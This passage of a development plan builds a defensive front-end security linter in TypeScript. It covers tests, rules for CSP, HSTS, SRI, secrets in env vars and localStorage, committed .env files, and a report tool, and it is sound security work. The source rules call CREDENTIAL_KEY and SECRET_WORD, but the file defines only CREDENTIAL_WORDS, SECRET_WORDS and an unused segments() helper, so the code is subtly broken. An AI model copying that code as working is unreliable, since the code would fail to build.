  it("does not treat a JSX onClick as an inline handler", () => {
    expect(ids(`<button onClick={go}>go</button>`, "Page.tsx")).not.toContain("inline-event-handler");
  });

  it("accepts a sandboxed third-party iframe", () => {
    expect(ids(`<iframe src="https://other.example/e" sandbox="allow-scripts"></iframe>`)).not.toContain("iframe-no-sandbox");
  });

  it("accepts a non-secret public env var", () => {
    expect(ids(`const url = process.env.NEXT_PUBLIC_SITE_URL`)).not.toContain("public-env-secret");
  });

  it("accepts localStorage for a non-credential key", () => {
    expect(ids(`localStorage.setItem("theme", "dark")`)).not.toContain("token-in-localstorage");
  });

  it("returns nothing at all for clean markup", () => {
    expect(securitySourceRules(`<main><h1>Hello</h1><p>Text</p></main>`)).toEqual([]);
  });
});

describe("every finding is actionable", () => {
  it("carries a message, a fix and a doc id", () => {
    const findings = securitySourceRules(`<a href="https://x.com" target="_blank">go</a>`);
    expect(findings.length).toBeGreaterThan(0);
    for (const f of findings) {
      expect(f.message.length).toBeGreaterThan(0);
      expect(f.fix.length).toBeGreaterThan(0);
      expect(f.doc).toBeTruthy();
      expect(f.line).toBeGreaterThan(0);
    }
  });
});
```

- [ ] **Step 2: Run to verify they fail**

```bash
npm run build && npx vitest run tests/security.test.ts
```

Expected: FAIL — `dist/security.js` does not exist.

- [ ] **Step 3: Implement `src/security.ts`**

```ts
// Security auditing for web front ends and their deployment configuration.
//
// Two families, same reason as lint.ts: markup spreads over many lines and
// needs the tag scanner; JS/config statements sit on one line and need a
// line scan.
//
// Every rule here is a fact about the source, never a guess. A false positive
// in a security report does not merely add noise — it teaches the reader the
// output is unreliable, and the true finding in the next run gets skimmed past
// with the rest.

import { scanTags, type LintFinding, type Tag } from "./lint.js";

const lineOf = (src: string, index: number): number =>
  src.slice(0, index).split("\n").length;

const attr = (tag: Tag, name: string): string | undefined => {
  const re = new RegExp(`\\b${name}\\s*=\\s*("([^"]*)"|'([^']*)'|\\{[^}]*\\})`, "i");
  const m = re.exec(tag.attrs);
  if (!m) return undefined;
  return m[2] ?? m[3] ?? m[1];
};

const hasAttr = (tag: Tag, name: string): boolean =>
  new RegExp(`\\b${name}\\b`, "i").test(tag.attrs);

const isCrossOrigin = (url: string): boolean =>
  /^https?:\/\//i.test(url) || url.startsWith("//");

const MARKUP_FILE = /\.(html?|vue|svelte|astro)$/i;

/** Sanitiser imports that make a raw-HTML sink defensible. */
const SANITISER = /\b(dompurify|sanitize-html|xss|Sanitizer)\b/i;

// Both of these match WHOLE SEGMENTS, never substrings. A bare
// /(token|auth|...)/i fires on `tokenizer-settings`, `authorized-theme`,
// `credentialsPolicy` and `NEXT_PUBLIC_TOKENIZER_URL` — ordinary names, flagged
// at error severity. That is the false positive this module refuses to ship,
// and it is worse than a miss: three bad warnings and nobody reads the fourth.
//
// `\b` is NOT sufficient. It fixes `authorized` but breaks `authToken`, because
// camelCase has no non-word boundary between the parts. Split the identifier on
// `_`, `-` and lowercase->uppercase transitions, then compare whole segments.
const SECRET_WORDS = new Set(["SECRET", "PRIVATE", "TOKEN", "PASSWORD", "PASSWD", "APIKEY", "API", "ACCESSKEY"]);
const CREDENTIAL_WORDS = new Set(["token", "jwt", "auth", "session", "credential"]);

/** Split `authToken`, `auth_token` and `NEXT_PUBLIC_API_KEY` into comparable parts. */
const segments = (name: string): string[] =>
  name.split(/[_\-]|(?<=[a-z0-9])(?=[A-Z])/).filter(Boolean);

export function securitySourceRules(code: string, filename?: string): LintFinding[] {
  const out: LintFinding[] = [];
  const push = (
    index: number,
    severity: LintFinding["severity"],
    rule: string,
    message: string,
    fix: string,
    doc: string,
  ) => out.push({ line: lineOf(code, index), severity, rule, message, fix, doc });

  // ── markup rules ───────────────────────────────────────────────────────────
  for (const tag of scanTags(code)) {
    const name = tag.name.toLowerCase();

    // Severity is deliberately `info`, not `error`. Browsers imply `noopener`
    // for `target="_blank"` on anchors — 95.58% global (caniuse
    // `mdn-html_elements_a_implicit_noopener`), and MDN states windows opened
    // from a `_blank` link "don't get an opener, unless explicitly requested
    // with rel=opener". Verified twice during Task 3, once by the implementer
    // and once by an independent reviewer.
    //
    // Erroring here would fire on correct modern markup. The attribute is still
    // worth adding for legacy engines and embedded webviews, which is what an
    // `info` says. The real residual risk moved to `window.open()` — see below.
    if (name === "a" && /target\s*=\s*["']?_blank/i.test(tag.attrs)) {
      const rel = attr(tag, "rel") ?? "";
      if (!/\bnoopener\b/i.test(rel)) {
        push(tag.index, "info", "blank-without-noopener",
          `target="_blank" without rel="noopener". Modern browsers imply noopener here, so this is defence for legacy engines and embedded webviews rather than a live hole.`,
          `Add rel="noopener noreferrer" — noreferrer also stops the Referer header, which the implicit behaviour does not.`,
          "frontend-attack-surface");
      }
    }

    if (name === "script") {
      const src = attr(tag, "src");
      if (src && isCrossOrigin(src) && !hasAttr(tag, "integrity")) {
        push(tag.index, "error", "external-script-no-sri",
          `Cross-origin script "${src}" loads without an integrity hash, so whoever controls that host controls your page.`,
          `Add integrity="sha384-…" and crossorigin="anonymous", or self-host the file.`,
          "web-security-headers");
      }
      const body = code.slice(tag.end, code.indexOf("</script", tag.end));
      if (!src && body.trim() && !hasAttr(tag, "nonce") && !hasAttr(tag, "integrity")) {
        push(tag.index, "warning", "inline-script-no-nonce",
          `Inline <script> with neither a nonce nor an integrity hash cannot run under a strict Content-Security-Policy.`,
          `Move it to a file, or render it with a per-response nonce.`,
          "web-security-headers");
      }
    }

    for (const a of ["src", "href"] as const) {
      const v = attr(tag, a);
      if (v && /^http:\/\//i.test(v)) {
        push(tag.index, "error", "http-subresource",
          `${a}="${v}" loads over plain HTTP; browsers block it as mixed content and it is modifiable in transit.`,
          `Use https://, or a protocol-relative path on your own origin.`,
          "web-security-headers");
      }
    }

    if (name === "iframe") {
      const src = attr(tag, "src");
      if (src && isCrossOrigin(src) && !hasAttr(tag, "sandbox")) {
        push(tag.index, "warning", "iframe-no-sandbox",
          `Third-party iframe "${src}" runs unsandboxed, with full scripting and navigation rights.`,
          `Add sandbox="allow-scripts" and widen it only as the embed requires.`,
          "frontend-attack-surface");
      }
    }

    if (name === "input" && /type\s*=\s*["']?password/i.test(tag.attrs)) {
      const ac = attr(tag, "autocomplete");
      if (!ac || /^off$/i.test(ac)) {
        push(tag.index, "warning", "password-autocomplete",
          ac ? `autocomplete="off" on a password field fights password managers, which pushes users toward weaker, reused passwords.`
             : `Password field has no autocomplete hint, so managers and passkey autofill cannot target it.`,
          `Use autocomplete="current-password" on sign-in and "new-password" on registration and reset.`,
          "auth-and-session-ux");
      }
    }

    if (MARKUP_FILE.test(filename ?? "") || !/[A-Z]/.test(tag.name)) {
      const m = /\bon[a-z]+\s*=\s*["']/i.exec(tag.attrs);
      if (m && MARKUP_FILE.test(filename ?? "")) {
        push(tag.index, "warning", "inline-event-handler",
          `Inline event handler blocks a strict Content-Security-Policy — it cannot be allowed without 'unsafe-inline'.`,
          `Attach the handler with addEventListener from a script file.`,
          "web-security-headers");
      }
    }

    if (/\bdangerouslySetInnerHTML\b/.test(tag.attrs) && !SANITISER.test(code)) {
      push(tag.index, "warning", "dangerous-html",
        `dangerouslySetInnerHTML with no sanitiser imported in this file renders untrusted markup as live HTML.`,
        `Sanitise the value first (DOMPurify), or render it as text.`,
        "frontend-attack-surface");
    }
  }

  // ── line rules ─────────────────────────────────────────────────────────────
  const lines = code.split("\n");
  let offset = 0;
  for (const line of lines) {
    const at = offset;
    offset += line.length + 1;

    if (/\b(v-html|\{@html)\b/.test(line) && !SANITISER.test(code)) {
      push(at, "warning", "dangerous-html",
        `Raw HTML binding with no sanitiser imported in this file renders untrusted markup as live HTML.`,
        `Sanitise the value first (DOMPurify), or bind it as text.`,
        "frontend-attack-surface");
    }

    const ls = /localStorage\.setItem\(\s*["'`]([^"'`]+)/.exec(line);
    if (ls && CREDENTIAL_KEY.test(ls[1])) {
      push(at, "error", "token-in-localstorage",
        `"${ls[1]}" is stored in localStorage, which any script on this origin can read — one XSS becomes lasting account takeover.`,
        `Keep the session in an HttpOnly, Secure, SameSite cookie, or hold the token in memory with a silent refresh.`,
        "auth-and-session-ux");
    }

    const env = /\b(?:NEXT_PUBLIC|VITE|PUBLIC|REACT_APP)_([A-Z0-9_]+)/.exec(line);
    if (env && SECRET_WORD.test(env[1])) {
      push(at, "error", "public-env-secret",
        `A build-time public variable named "${env[0]}" is inlined into the client bundle and is public the moment it ships.`,
        `Move it to a server-only variable and rotate the value — anything already shipped is compromised.`,
        "frontend-attack-surface");
    }

    const secret = /\b(?:secret|password|api_?key|access_?key|private_?key|token)\s*[:=]\s*["'`]([A-Za-z0-9+/_-]{24,})["'`]/i.exec(line);
    if (secret) {
      push(at, "error", "hardcoded-secret",
        `A credential-shaped literal is assigned in source; committed secrets stay in git history after deletion.`,
        `Read it from a server-side environment variable and rotate the value.`,
        "frontend-attack-surface");
    }

    // This is where the reverse-tabnabbing risk actually lives now. Unlike an
    // anchor, `window.open()` still grants `window.opener` by default (MDN,
    // verified in Task 3), so an omitted `noopener` here is a live hole rather
    // than a legacy hedge — hence `warning` where the anchor rule is `info`.
    const opened = /window\.open\s*\(/.exec(line);
    if (opened && !/noopener/i.test(line)) {
      push(at, "warning", "window-open-without-noopener",
        `window.open() without "noopener" in its features string leaves the opened page a window.opener handle back to this one, which it can use to navigate you somewhere else.`,
        `Pass "noopener" in the third argument, or null the returned handle's opener.`,
        "frontend-attack-surface");
    }

    if (/postMessage\s*\([^)]*,\s*["'`]\*["'`]\s*\)/.test(line)) {
      push(at, "warning", "postmessage-wildcard-origin",
        `postMessage with a "*" target origin delivers the payload to whatever document currently occupies that frame.`,
        `Pass the exact origin you intend, and check event.origin on the receiving side.`,
        "frontend-attack-surface");
    }
  }

  return out.sort((a, b) => a.line - b.line);
}
```

Note on `inline-event-handler`: it fires only for markup files, because JSX `onClick={fn}` is not an inline handler and flagging it would be exactly the false positive this module refuses to ship. The tests assert both directions.

- [ ] **Step 4: Run tests to verify they pass**

```bash
npm test
```

Expected: PASS. If `dangerous-html` fires twice for a Vue file (once from the tag loop, once from the line loop), deduplicate by `rule` + `line` before returning.

- [ ] **Step 5: Commit**

```bash
git add src/security.ts tests/security.test.ts
git commit -m "feat: add the security source rules

Twelve rules over markup and script: reverse tabnabbing, unpinned
cross-origin scripts, mixed content, credentials in localStorage,
secret-named public env vars, unsandboxed third-party frames, wildcard
postMessage, and raw-HTML sinks with no sanitiser in the file.

Each rule is tested in both directions. The negative tests are the
load-bearing ones: a security linter that cries wolf gets its real
findings skimmed past with the rest."
```

---

### Task 8: Configuration rules

**Files:**
- Modify: `src/security.ts`
- Test: `tests/security.test.ts`

**Interfaces:**
- Consumes: `securitySourceRules` from Task 7, `scanProject` from Task 6.
- Produces:
  - `export const SECURITY_EXTENSIONS: string[]`
  - `export const SECURITY_FILENAMES: string[]`
  - `export interface HeaderHit { value: string; file: string; line: number; undeterminable: boolean }`
  - `export function extractHeaders(files: Array<{ path: string; source: string }>): Map<string, HeaderHit>`
  - `export function securityConfigRules(files: Array<{ path: string; source: string }>): LintFinding[]`

- [ ] **Step 1: Write the failing tests**

Append to `tests/security.test.ts`:

```ts
import { securityConfigRules, extractHeaders } from "../dist/security.js";

const cfgIds = (files: Array<{ path: string; source: string }>) =>
  securityConfigRules(files).map((f) => f.rule);

describe("config rules — CSP discovery", () => {
  it("reports csp-missing when no configuration mentions one", () => {
    expect(cfgIds([{ path: "next.config.js", source: `module.exports = {}` }]))
      .toContain("csp-missing");
  });

  it("finds a CSP in vercel.json", () => {
    const source = JSON.stringify({
      headers: [{ source: "/(.*)", headers: [
        { key: "Content-Security-Policy", value: "default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'" },
      ] }],
    }, null, 2);
    expect(cfgIds([{ path: "vercel.json", source }])).not.toContain("csp-missing");
  });

  it("finds a CSP in a _headers file", () => {
    const source = `/*\n  Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\n`;
    expect(cfgIds([{ path: "_headers", source }])).not.toContain("csp-missing");
  });

  it("finds a CSP in netlify.toml", () => {
    const source = `[[headers]]\n  for = "/*"\n  [headers.values]\n  Content-Security-Policy = "default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"\n`;
    expect(cfgIds([{ path: "netlify.toml", source }])).not.toContain("csp-missing");
  });

  it("reports a runtime-assembled CSP as undeterminable, not missing", () => {
    const source = "headers.set('Content-Security-Policy', `default-src 'self'; script-src 'nonce-${nonce}'`)";
    const ids = cfgIds([{ path: "middleware.ts", source }]);
    expect(ids).not.toContain("csp-missing");
    expect(ids).toContain("csp-undeterminable");
  });

  it("finds a CSP in proxy.ts, the Next.js 16 name for middleware", () => {
    // Next.js 16 deprecated and renamed middleware.ts to proxy.ts. Reading only
    // the old name would report csp-missing on every Next.js 16 project that
    // sets a CSP correctly — a false positive on the most common modern stack.
    const source = `export function proxy() { res.headers.set('Content-Security-Policy', "default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'") }`;
    expect(cfgIds([{ path: "proxy.ts", source }])).not.toContain("csp-missing");
  });
});

describe("config rules — CSP weaknesses", () => {
  const withCsp = (csp: string) => cfgIds([
    { path: "_headers", source: `/*\n  Content-Security-Policy: ${csp}\n` },
  ]);

  it("flags unsafe-inline in script-src", () => {
    expect(withCsp("default-src 'self'; script-src 'self' 'unsafe-inline'")).toContain("csp-unsafe-inline");
  });

  it("flags unsafe-eval in script-src", () => {
    expect(withCsp("default-src 'self'; script-src 'self' 'unsafe-eval'")).toContain("csp-unsafe-eval");
  });

  it("flags a wildcard script-src", () => {
    expect(withCsp("default-src 'self'; script-src *")).toContain("csp-wildcard");
  });

  it("flags missing object-src, base-uri and frame-ancestors", () => {
    const ids = withCsp("default-src 'self'; script-src 'self'");
    expect(ids).toContain("csp-missing-object-src");
    expect(ids).toContain("csp-missing-base-uri");
    expect(ids).toContain("csp-missing-frame-ancestors");
  });

  it("stays silent on a strict policy — the clean case must be provably clean", () => {
    const strict = "default-src 'self'; script-src 'nonce-abc123' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; require-trusted-types-for 'script'";
    const ids = withCsp(strict);
    expect(ids.filter((r) => r.startsWith("csp-"))).toEqual([]);
    expect(ids).not.toContain("trusted-types-absent");
  });
});

describe("config rules — the other headers", () => {
  const headersFile = (body: string) => [{ path: "_headers", source: `/*\n${body}\n` }];

  it("flags missing HSTS", () => {
    expect(cfgIds(headersFile("  X-Content-Type-Options: nosniff"))).toContain("hsts-missing");
  });

  it("flags a short HSTS max-age", () => {
    expect(cfgIds(headersFile("  Strict-Transport-Security: max-age=600"))).toContain("hsts-short-max-age");
  });

  it("accepts a long HSTS max-age with subdomains", () => {
    const ids = cfgIds(headersFile("  Strict-Transport-Security: max-age=31536000; includeSubDomains"));
    expect(ids).not.toContain("hsts-short-max-age");
    expect(ids).not.toContain("hsts-no-subdomains");
  });

  it("flags a referrer policy that leaks more than the browser default", () => {
    expect(cfgIds(headersFile("  Referrer-Policy: unsafe-url"))).toContain("referrer-policy-unsafe");
  });

  it("does not flag an absent Referrer-Policy", () => {
    // strict-origin-when-cross-origin has been the browser default since the
    // November 2020 spec revision, so absence is already the recommended value.
    // A rule that fires here would fire on correct configuration.
    expect(cfgIds(headersFile("  X-Content-Type-Options: nosniff"))).not.toContain("referrer-policy-unsafe");
  });

  it("does not flag strict-origin-when-cross-origin set explicitly", () => {
    expect(cfgIds(headersFile("  Referrer-Policy: strict-origin-when-cross-origin"))).not.toContain("referrer-policy-unsafe");
  });

  it("flags production source maps", () => {
    expect(cfgIds([{ path: "next.config.js", source: `module.exports = { productionBrowserSourceMaps: true }` }]))
      .toContain("sourcemaps-in-production");
  });
});

describe("config rules — committed env files", () => {
  it("flags a .env that is not gitignored", () => {
    const files = [
      { path: ".env", source: "API_KEY=abc" },
      { path: ".gitignore", source: "node_modules\ndist\n" },
    ];
    expect(cfgIds(files)).toContain("env-committed");
  });

  it("accepts a .env that is gitignored", () => {
    const files = [
      { path: ".env", source: "API_KEY=abc" },
      { path: ".gitignore", source: "node_modules\n.env\n" },
    ];
    expect(cfgIds(files)).not.toContain("env-committed");
  });
});
```

- [ ] **Step 2: Run to verify they fail**

```bash
npm run build && npx vitest run tests/security.test.ts
```

Expected: FAIL — `securityConfigRules` is not exported.

- [ ] **Step 3: Implement**

Append to `src/security.ts`:

```ts
// ── configuration rules ──────────────────────────────────────────────────────
//
// Header state is inferred from local files. The server makes no network call,
// so a CDN or reverse proxy can add headers this audit cannot see — the report
// says so rather than implying the absence is real.
//
// Configuration is read as text and never evaluated, the same rule
// import_design_tokens set for tailwind.config.js.

// `.ts` covers both middleware.ts and proxy.ts — Next.js 16 deprecated the
// former and renamed it to the latter, so narrowing this list to named files
// would go blind on every Next.js 16 project.
export const SECURITY_EXTENSIONS = [
  ".html", ".htm", ".jsx", ".tsx", ".vue", ".svelte", ".astro", ".ts", ".js", ".mjs", ".cjs", ".json", ".toml",
];

export const SECURITY_FILENAMES = [
  "_headers", ".env", ".env.local", ".env.production", ".gitignore", "netlify.toml", "vercel.json",
];

const HEADER_NAMES = [
  "Content-Security-Policy",
  "Content-Security-Policy-Report-Only",
  "Strict-Transport-Security",
  "X-Content-Type-Options",
  "Referrer-Policy",
  "Permissions-Policy",
] as const;

export interface HeaderHit {
  value: string;
  file: string;
  line: number;
  /** The value is assembled at runtime, so its contents cannot be read here. */
  undeterminable: boolean;
}

/**
 * Find each header's declared value across every configuration shape we support:
 * `key: 'X', value: '…'` (next.config, vercel.json), `X = "…"` (netlify.toml),
 * `X: …` to end of line (_headers), and `.set('X', v)` (middleware).
 */
export function extractHeaders(files: Array<{ path: string; source: string }>): Map<string, HeaderHit> {
  const found = new Map<string, HeaderHit>();

  for (const file of files) {
    for (const header of HEADER_NAMES) {
      const nameRe = new RegExp(header.replace(/-/g, "-"), "gi");
      let m: RegExpExecArray | null;
      while ((m = nameRe.exec(file.source)) !== null) {
        const after = file.source.slice(m.index + header.length, m.index + header.length + 4000);
        const line = file.source.slice(0, m.index).split("\n").length;

        // `key: 'Content-Security-Policy'` … `value: '…'`
        let value: string | undefined;
        let undeterminable = false;

        const quoted = /^["']?\s*(?:,\s*)?(?:["']?value["']?\s*[:=]\s*)?(["'`])([\s\S]*?)\1/.exec(after);
        const colon = /^\s*[:=]\s*([^\n]+)/.exec(after);

        if (quoted) {
          value = quoted[2];
          if (quoted[1] === "`" && /\$\{/.test(value)) undeterminable = true;
        } else if (colon) {
          value = colon[1].trim().replace(/^["'`]|["'`],?$/g, "");
        }

        if (value === undefined) continue;
        if (!undeterminable && /\$\{|\+\s*[A-Za-z_$]/.test(value)) undeterminable = true;

        const key = header.toLowerCase();
        const existing = found.get(key);
        // Prefer a readable declaration over an undeterminable one.
        if (!existing || (existing.undeterminable && !undeterminable)) {
          found.set(key, { value, file: file.path, line, undeterminable });
        }
      }
    }
  }

  return found;
}

/** Split a policy into directive → source list. */
export function parseCsp(value: string): Map<string, string[]> {
  const out = new Map<string, string[]>();
  for (const part of value.split(";")) {
    const tokens = part.trim().split(/\s+/).filter(Boolean);
    if (!tokens.length) continue;
    out.set(tokens[0].toLowerCase(), tokens.slice(1));
  }
  return out;
}

export function securityConfigRules(files: Array<{ path: string; source: string }>): LintFinding[] {
  const out: LintFinding[] = [];
  const push = (
    file: string, line: number, severity: LintFinding["severity"],
    rule: string, message: string, fix: string, doc = "web-security-headers",
  ) => out.push({ line, severity, rule, message: `${file}: ${message}`, fix, doc });

  const headers = extractHeaders(files);
  const csp = headers.get("content-security-policy") ?? headers.get("content-security-policy-report-only");

  // ── CSP ────────────────────────────────────────────────────────────────────
  if (!csp) {
    push("configuration", 1, "error", "csp-missing",
      `No Content-Security-Policy is declared in any configuration file read here.`,
      `Start with Content-Security-Policy-Report-Only, collect reports, then enforce a nonce-based policy.`);
  } else if (csp.undeterminable) {
    push(csp.file, csp.line, "info", "csp-undeterminable",
      `A Content-Security-Policy is set from a value assembled at runtime, so its directives cannot be read from source.`,
      `Verify the emitted header in a response, or extract the static parts into a named constant.`);
  } else {
    const directives = parseCsp(csp.value);
    const scriptSrc = directives.get("script-src") ?? directives.get("default-src") ?? [];

    if (scriptSrc.includes("'unsafe-inline'") && !scriptSrc.some((s) => s.startsWith("'nonce-") || s.startsWith("'sha"))) {
      push(csp.file, csp.line, "error", "csp-unsafe-inline",
        `script-src allows 'unsafe-inline', which permits exactly the injected script a policy exists to stop.`,
        `Replace it with a per-response 'nonce-…' plus 'strict-dynamic'.`);
    }
    if (scriptSrc.includes("'unsafe-eval'")) {
      push(csp.file, csp.line, "error", "csp-unsafe-eval",
        `script-src allows 'unsafe-eval', which re-opens string-to-code execution.`,
        `Remove it and replace any eval/new Function use in the bundle.`);
    }
    if (scriptSrc.includes("*") || scriptSrc.includes("http:") || scriptSrc.includes("https:")) {
      push(csp.file, csp.line, "error", "csp-wildcard",
        `script-src permits any host, which makes the policy decorative.`,
        `Use 'nonce-…' with 'strict-dynamic' instead of a host list.`);
    }
    for (const [directive, rule] of [
      ["object-src", "csp-missing-object-src"],
      ["base-uri", "csp-missing-base-uri"],
      ["frame-ancestors", "csp-missing-frame-ancestors"],
    ] as const) {
      if (!directives.has(directive)) {
        push(csp.file, csp.line, "warning", rule,
          `${directive} is not set, so it falls back to a permissive default.`,
          `Add ${directive} 'none' unless the site genuinely needs otherwise.`);
      }
    }
    if (!directives.has("require-trusted-types-for")) {
      push(csp.file, csp.line, "info", "trusted-types-absent",
        `Trusted Types is not enabled; DOM XSS remains a case-by-case problem rather than an eliminated class.`,
        `Add require-trusted-types-for 'script' in report-only first.`);
    }
  }

  // ── HSTS ───────────────────────────────────────────────────────────────────
  const hsts = headers.get("strict-transport-security");
  if (!hsts) {
    push("configuration", 1, "warning", "hsts-missing",
      `No Strict-Transport-Security header, so the first visit over HTTP is downgradeable.`,
      `Set max-age=31536000; includeSubDomains once every subdomain serves HTTPS.`);
  } else if (!hsts.undeterminable) {
    const age = /max-age\s*=\s*(\d+)/i.exec(hsts.value);
    if (age && Number(age[1]) < 15552000) {
      push(hsts.file, hsts.line, "warning", "hsts-short-max-age",
        `HSTS max-age is ${age[1]}s; below 180 days (15552000) it gives little protection and is not preload-eligible.`,
        `Raise it to 31536000 once you are confident in the HTTPS setup.`);
    }
    if (!/includeSubDomains/i.test(hsts.value)) {
      push(hsts.file, hsts.line, "info", "hsts-no-subdomains",
        `HSTS omits includeSubDomains, leaving subdomains downgradeable.`,
        `Add includeSubDomains — but only once every subdomain serves HTTPS, because it is disruptive to undo.`);
    }
  }

  // ── the cheap ones ─────────────────────────────────────────────────────────
  if (!headers.has("x-content-type-options")) {
    push("configuration", 1, "warning", "x-content-type-options-missing",
      `X-Content-Type-Options is not set, so browsers may MIME-sniff a response into a script.`,
      `Set X-Content-Type-Options: nosniff. It has no downside.`);
  }
  // There is deliberately no "referrer-policy-missing" rule. Since the November
  // 2020 spec revision, strict-origin-when-cross-origin IS the browser default
  // (verified against MDN) — an absent header already behaves the way we would
  // have recommended, so flagging its absence would fire on correct
  // configuration. Only an explicitly worse value is a finding.
  const LEAKY_REFERRER = /^(unsafe-url|no-referrer-when-downgrade|origin-when-cross-origin)$/i;
  const ref = headers.get("referrer-policy");
  if (ref && !ref.undeterminable && LEAKY_REFERRER.test(ref.value.trim())) {
    push(ref.file, ref.line, "warning", "referrer-policy-unsafe",
      `Referrer-Policy "${ref.value.trim()}" sends more than the browser default, leaking full URLs — including any token in a path or query — to other origins.`,
      `Remove the header to get strict-origin-when-cross-origin, or set that value explicitly.`);
  }
  if (!headers.has("permissions-policy")) {
    push("configuration", 1, "warning", "permissions-policy-missing",
      `No Permissions-Policy, so embedded content may request camera, microphone and geolocation.`,
      `Set Permissions-Policy: camera=(), microphone=(), geolocation=() and open up only what you use.`);
  }

  // ── build configuration ────────────────────────────────────────────────────
  for (const file of files) {
    if (/productionBrowserSourceMaps\s*:\s*true|sourcemap\s*:\s*true/.test(file.source)) {
      const line = file.source.slice(0, file.source.search(/productionBrowserSourceMaps|sourcemap/)).split("\n").length;
      push(file.path, line, "warning", "sourcemaps-in-production",
        `Production source maps publish your original sources, comments and internal paths.`,
        `Disable them, or upload them privately to your error reporter instead of serving them.`,
        "frontend-attack-surface");
    }
  }

  // ── committed env files ────────────────────────────────────────────────────
  const gitignore = files.find((f) => f.path.endsWith(".gitignore"))?.source ?? "";
  const ignored = new Set(gitignore.split("\n").map((l) => l.trim().replace(/^\/+|\/+$/g, "")));
  for (const file of files) {
    const base = file.path.split("/").pop() ?? file.path;
    if (!/^\.env(\.|$)/.test(base)) continue;
    if (ignored.has(base) || ignored.has(".env*") || ignored.has(".env")) continue;
    push(file.path, 1, "error", "env-committed",
      `${base} sits in the project and is not covered by .gitignore; once committed it stays in git history after deletion.`,
      `Add it to .gitignore, rotate every value it holds, and purge it from history if it was pushed.`,
      "frontend-attack-surface");
  }

  return out;
}
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
npm test
```

Expected: PASS. The strict-policy test is the one to watch — if it reports anything, the rule is over-firing and must be narrowed rather than the test relaxed.

- [ ] **Step 5: Commit**

```bash
git add src/security.ts tests/security.test.ts
git commit -m "feat: infer header state from local configuration

Reads next.config, vercel.json, netlify.toml, _headers and middleware as
text — never evaluated — and reports CSP weaknesses, missing HSTS,
unsafe referrer policy, production source maps and uncommitted-but-
unignored env files.

A policy assembled at runtime reports as undeterminable rather than
missing. Claiming a site has no CSP because ours could not read a
template literal would be the worst kind of wrong: confident, and in the
direction of false alarm."
```

---

### Task 9: The report and the tool

**Files:**
- Modify: `src/security.ts`, `src/index.ts`
- Test: `tests/security.test.ts`, `tests/server.test.ts`, `tests/integrity.test.ts`

**Interfaces:**
- Consumes: `securitySourceRules`, `securityConfigRules`, `SECURITY_EXTENSIONS`, `SECURITY_FILENAMES`, `scanProject`.
- Produces: `export function securityReport(input: { source?: string; filename?: string; root?: string }): string`, and the registered tool `audit_security`.

- [ ] **Step 1: Write the failing tests**

Append to `tests/security.test.ts`:

```ts
import { securityReport } from "../dist/security.js";

describe("the report", () => {
  it("always states what it could not see", () => {
    const clean = securityReport({ source: `<main><h1>Hi</h1></main>` });
    expect(clean).toMatch(/not visible to this audit/i);
    expect(clean).toMatch(/CDN|proxy/i);
  });

  it("states it for a report with findings too", () => {
    const dirty = securityReport({ source: `<script src="https://cdn.example.com/a.js"></script>` });
    expect(dirty).toMatch(/not visible to this audit/i);
    expect(dirty).toContain("external-script-no-sri");
  });
});
```

Add `"audit_security"` to the `TOOL_NAMES` set in `tests/integrity.test.ts`.

`tests/server.test.ts` holds a `SMOKE` map (line 28) and asserts that **every registered tool has an entry in it** — a new tool without one fails the suite. Add:

```ts
  audit_security: { code: `<script src="https://cdn.example.com/a.js"></script>` },
```

That same suite calls each tool and requires the response body to exceed 40 characters and not begin with "no matches" — the snippet above produces a real finding, so it satisfies both. Its tool-count assertion is a `>=` floor, not an exact number, so nothing there needs changing.

- [ ] **Step 2: Run to verify they fail**

```bash
npm run build && npx vitest run tests/security.test.ts tests/server.test.ts tests/integrity.test.ts
```

Expected: FAIL — `securityReport` is not exported, `audit_security` is not registered.

- [ ] **Step 3: Implement the report**

Append to `src/security.ts`:

```ts
import { scanProject } from "./project.js";

const NOT_VISIBLE = `
## Not visible to this audit

This audit reads local files only — it makes no request to your site. It cannot see:

- Headers added by a CDN, WAF or reverse proxy (Cloudflare, Fastly, nginx) after your app responds.
- Headers set by runtime logic that depends on the request.
- Any value assembled from variables, which is reported as undeterminable rather than absent.
- Server-side concerns entirely: authorization, injection, and access control are out of scope for a design server.

A clean result here means these files declare nothing wrong. Confirm the emitted headers on a real response before treating it as coverage.`;

export function securityReport(input: { source?: string; filename?: string; root?: string }): string {
  const lines: string[] = ["# Security audit", ""];
  let findings: LintFinding[] = [];
  let scanned = "";

  if (input.root) {
    const scan = scanProject(input.root, SECURITY_EXTENSIONS, SECURITY_FILENAMES);
    const files = scan.files.map((f) => ({ path: f.path, source: f.source }));
    for (const f of files) {
      findings.push(...securitySourceRules(f.source, f.path).map((x) => ({ ...x, message: `${f.path}:${x.line} — ${x.message}` })));
    }
    findings.push(...securityConfigRules(files));
    scanned = `Scanned ${scan.files.length} files under \`${input.root}\`.`;
    if (scan.hitFileCap) scanned += ` Stopped at the ${scan.files.length}-file cap — results are partial.`;
    if (scan.skippedLarge.length) scanned += ` Skipped ${scan.skippedLarge.length} oversized file(s).`;
  } else {
    findings = securitySourceRules(input.source ?? "", input.filename);
    scanned = "Scanned one snippet. Configuration rules need a directory — pass `path` to check headers.";
  }

  const errors = findings.filter((f) => f.severity === "error");
  const warnings = findings.filter((f) => f.severity === "warning");
  const info = findings.filter((f) => f.severity === "info");

  lines.push(scanned, "");
  lines.push(`**${errors.length} error · ${warnings.length} warning · ${info.length} info**`, "");

  if (!findings.length) {
    lines.push("No findings in what was read.", "");
  } else {
    for (const group of [
      { title: "Errors", items: errors },
      { title: "Warnings", items: warnings },
      { title: "Notes", items: info },
    ]) {
      if (!group.items.length) continue;
      lines.push(`## ${group.title}`, "");
      for (const f of group.items) {
        lines.push(`- **${f.rule}** (line ${f.line}) — ${f.message}`);
        lines.push(`  - Fix: ${f.fix}`);
        if (f.doc) lines.push(`  - Read: \`get_design_doc("${f.doc}")\``);
      }
      lines.push("");
    }
  }

  lines.push(NOT_VISIBLE);
  return lines.join("\n");
}
```

- [ ] **Step 4: Register the tool**

In `src/index.ts`, add the import alongside the existing ones:

```ts
import { securityReport } from "./security.js";
```

and register after `audit_project` (follow the numbering comment style of its neighbours):

```ts
// ── Tool 30: audit security ──────────────────────────────────────────────────
tool(
  "audit_security",
